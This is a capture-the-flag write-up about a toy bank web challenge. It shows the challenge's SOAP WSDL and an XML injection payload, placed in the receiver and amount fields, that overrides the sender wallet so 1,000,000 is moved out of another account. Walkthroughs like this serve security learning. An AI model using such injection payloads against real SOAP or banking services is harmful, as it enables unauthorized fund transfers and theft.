This site is a simple bank application. After register, you will have 110 in your account. And by ``vip.php``, you need 1000000 to become important.

Any account can transfer to other acounts, but register need reCAPTCHA, so you can't register many accounts to make you important.

After a look at this site, we found there has a hint in ``for_developers.php``'s source code:

```
http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php
```

it returns 

```xml
<?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="Bank"
             targetNamespace="urn:Bank"
             xmlns:tns="urn:Bank"
             xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
             xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
             xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
             xmlns="http://schemas.xmlsoap.org/wsdl/">

    <message name="BalanceRequest">
        <part name="wallet_num" type="xsd:decimal"/>
    </message>

    <message name="BalanceResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <message name="internalTransferRequest">
        <part name="receiver_wallet_num" type="xsd:decimal"/>
        <part name="sender_wallet_num" type="xsd:decimal"/>
        <part name="amount" type="xsd:float"/>
        <part name="token" type="xsd:string"/>
    </message>

    <message name="internalTransferResponse">
        <part name="code" type="xsd:float"/>
        <part name="status" type="xsd:string"/>
    </message>

    <portType name="BankServicePort">
        <operation name="requestBalance">
            <input message="tns:BalanceRequest"/>
            <output message="tns:BalanceResponse"/>
        </operation>
        <operation name="internalTransfer">
            <input message="tns:internalTransferRequest"/>
            <output message="tns:internalTransferResponse"/>
        </operation>
    </portType>

    <binding name="BankServiceBinding" type="tns:BankServicePort">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <operation name="requestBalance">
            <soap:operation soapAction="urn:requestBalanceAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
        <operation name="internalTransfer">
            <soap:operation soapAction="urn:internalTransferAction"/>
            <input>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </input>
            <output>
                <soap:body use="encoded" namespace="urn:Bank" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
            </output>
        </operation>
    </binding>

    <wsdl:service name="BankService">
        <wsdl:port name="BankServicePort" binding="tns:BankServiceBinding">
            <soap:address location="http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php" />
        </wsdl:port>
    </wsdl:service>
</wsdl:definitions>
```

Seems we can transfer with soap client, but we don't know token. However, we could use XML injection here. when we submit a transfer with such receiver and amount:

```xml
1401</receiver_wallet_num><sender_wallet_num xsi:type="xsd:decimal">1337</sender_wallet_num><!--
```

```xml
--><amount xsi:type="xsd:float">1000000
```

We will get 1000000 money.

After use ``requestBalance``, we will find there are much money in ``1337``.
So we stole 1000000 from it and get the flag.
